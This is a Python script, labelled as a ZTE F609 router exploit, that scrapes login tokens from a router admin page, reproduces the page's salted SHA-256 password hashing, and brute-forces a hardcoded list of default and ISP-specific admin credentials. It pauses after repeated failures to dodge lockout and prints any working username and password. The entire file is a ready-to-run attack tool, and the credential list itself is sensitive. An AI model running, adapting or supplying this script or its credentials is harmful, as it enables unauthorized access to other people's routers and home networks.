import hashlib
import random
import re
import requests
import time
from bs4 import BeautifulSoup

# ASCII Art
ascii_art = """
  _____  ____                 _         ______ __   ___   ___                    _       _ _   
 |  __ \|  _ \               | |       |  ____/ /  / _ \ / _ \                  | |     (_) |  
 | |__) | |_) |  ______   ___| |_ ___  | |__ / /_ | | | | (_) |   _____  ___ __ | | ___  _| |_ 
 |  _  /|  _ <  |______| |_  / __/ _ \ |  __| '_ \| | | |\__, |  / _ \ \/ / '_ \| |/ _ \| | __|
 | | \ \| |_) |           / /| ||  __/ | |  | (_) | |_| |  / /  |  __/>  <| |_) | | (_) | | |_ 
 |_|  \_\____/           /___|\__\___| |_|   \___/ \___/  /_/    \___/_/\_\ .__/|_|\___/|_|\__| by rootbakar
                                                                          | |                  
                                                                          |_|              
"""

# Print ASCII art
print(ascii_art)

# Function to generate a random number
def generate_random_number():
    return random.randint(10000000, 99999999)

# Function to hash password using SHA-256
def hash_password(after_password, pwd_random):
    combined = f"{after_password}{pwd_random}"
    hash_obj = hashlib.sha256(combined.encode())
    return hash_obj.hexdigest()

# List of usernames and passwords to try
credentials = [
    ("user", "user"),
    ("user", "user1234"),
    ("admin", "Telkomdso123"),
    ("admin", "admin"),
    ("root", "admin"),
    ("telecomadmin", "admintelecom"),
    ("telecomadmin", "zep2kjzol"),
    ("support", "support"),
    ("support", "theworldinyourhand"),
    ("admin", "Atr3gy!0n@l$to#e"),
    ("admin", "Pq@54r!e8ow&q#u"),
    ("admin", "Yu9j#4qa!rth#y"),
    ("admin", "Mn@lh4!nk9#m"),
    ("admin", "Dj9@t!n03g4r6#f"),
    ("admin", "telkomjatineg4r4"),
    ("admin", "Bw!t3lm3d@gy#s"),
    ("admin", "Siy!dho@r7o#s"),
    ("admin", "Zs3!m@rh4n#z"),
    ("admin", "Qc!80ebor3#to#b"),
    ("admin", "M@jal$4eya#m")
]

# User input for URL

url = input("Enter URL: ")

# Function to fetch HTML content from URL
def fetch_html_content():
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise an exception for bad response status
        return response.text, response.status_code
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None, None

# Function to extract Frm_Logintoken from HTML using regex
def extract_logintoken(html_content):
    login_token_match = re.search(r'Frm_Logintoken",\s*"(\d+)"', html_content)
    return login_token_match.group(1) if login_token_match else None

# Function to extract Frm_Loginchecktoken from HTML using regex
def extract_loginchecktoken(html_content):
    login_checktoken_match = re.search(r'Frm_Loginchecktoken",\s*"(\d+)"', html_content)
    return login_checktoken_match.group(1) if login_checktoken_match else None

# Function to check if tokens are found
def check_tokens(html_content):
    frm_logintoken = extract_logintoken(html_content)
    frm_loginchecktoken = extract_loginchecktoken(html_content)
    return frm_logintoken, frm_loginchecktoken

# Headers for HTTP request
headers = {
    "Content-Length": "181",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://192.168.1.1",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://192.168.1.1/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,mr-IN;q=0.6,mr;q=0.5",
    "Cookie": "_TESTCOOKIESUPPORT=1",
    "Connection": "keep-alive"
}

# Function to perform login and check response
def check_login(username, password, frm_logintoken, frm_loginchecktoken):
    data = {
        "action": "login",
        "Username": username,
        "Password": password,
        "Frm_Logintoken": frm_logintoken,
        "Frm_Loginchecktoken": frm_loginchecktoken,
        "UserRandomNum": user_random_num
    }
    try:
        response = requests.post(url, data=data, headers=headers, allow_redirects=False)
        if response.status_code == 302 and 'Location' in response.headers and '/start.ghtml' in response.headers['Location']:
            return True, None
        else:
            soup = BeautifulSoup(response.text, 'html.parser')
            errmsg_tag = soup.find('font', id='errmsg', class_='notecontent')
            errmsg = errmsg_tag.text.strip() if errmsg_tag else None
            return False, errmsg
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False, None

# Trying username and password combinations
success_credentials = []
consecutive_200_count = 0
for username, password in credentials:
    html_content, status_code = fetch_html_content()
    if html_content:
        frm_logintoken, frm_loginchecktoken = check_tokens(html_content)
        if not frm_logintoken or not frm_loginchecktoken:
            print("Failed to find required tokens on the page.")
            exit()

        # Generate UserRandomNum
        user_random_num = generate_random_number()

        # Hash Password
        password_hash = hash_password(password, str(user_random_num))

        # Check login
        success, errmsg = check_login(username, password_hash, frm_logintoken, frm_loginchecktoken)
        if success:
            success_credentials.append((username, password))
            consecutive_200_count = 0  # Reset counter after successful login
        elif status_code == 200:
            consecutive_200_count += 1

        # If 3 consecutive responses with status code 200 are received, wait 60 seconds
        if consecutive_200_count == 3:
            print("\nDetected 3 consecutive responses with status code 200. Waiting for 60 seconds...")
            time.sleep(60)
            consecutive_200_count = 0  # Reset counter after waiting

# Display successful username and password combinations
if success_credentials:
    print("\nHere are the successful username and password combinations found:")
    for username, password in success_credentials:
        print(f"\033[92mUsername: {username}\033[0m")
        print(f"\033[92mPassword: {password}\033[0m")
        print("------------")
else:
    print("No successful username and password combinations found after several attempts.")

